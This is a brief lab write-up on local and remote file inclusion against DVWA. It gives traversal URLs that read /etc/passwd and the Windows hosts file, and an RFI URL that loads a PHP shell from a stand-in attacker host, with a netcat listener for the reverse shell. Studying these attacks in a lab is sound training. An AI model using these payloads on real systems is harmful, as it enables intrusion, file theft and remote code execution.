# File Inclusion Attacks

## Objective
To exploit vulnerabilities in web applications that dynamically include files, potentially leading to information disclosure or remote code execution.

## Theory & Concepts
- **LFI (Local File Inclusion)**: The application allows the user to include files that are already present on the local server (e.g., `/etc/passwd`).
- **RFI (Remote File Inclusion)**: The application allows the user to include files from a remote server, which can lead to the execution of malicious scripts.
- **Cause**: Poorly sanitized user input passed to filesystem APIs like `include()`, `require()`, or `file_get_contents()`.

## Tools Used
- DVWA
- Netcat (for reverse shell)

## Commands & Practical Steps
- **LFI (Linux)**:
  - URL: `http://192.168.56.101/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd`
- **LFI (Windows)**:
  - URL: `?page=C:\Windows\System32\drivers\etc\hosts`
- **RFI (Reverse Shell)**:
  - Put `shell.txt` (PHP shell) on attacker server.
  - URL: `?page=http://attacker.com/shell.txt`
  - Attacker: `nc -lvp 4444`

## Practical Demonstration Summary
Exploited an LFI vulnerability to read sensitive system configuration files (`/etc/passwd`). Demonstrated RFI by including a remote PHP shell, which resulted in a successful reverse shell connection back to the attacker machine.
